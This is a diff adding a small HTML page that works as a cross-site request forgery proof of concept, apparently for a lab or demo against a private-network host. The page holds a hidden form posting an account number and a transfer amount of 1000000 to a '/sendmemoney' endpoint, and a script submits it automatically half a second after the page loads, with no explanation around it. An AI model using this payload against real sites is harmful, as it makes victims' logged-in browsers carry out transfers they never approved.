@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form method="post" action="http://192.168.2.25:3000/sendmemoney">
+       <input type="hidden" name="account" value="1234567" />
+       <input type="hidden" name="amount" value="1000000" />
+     </form>
+     <script>
+       setTimeout(function() {
+         document.forms[0].submit()
+       }, 500);
+     </script>
+  </body>
+</html>
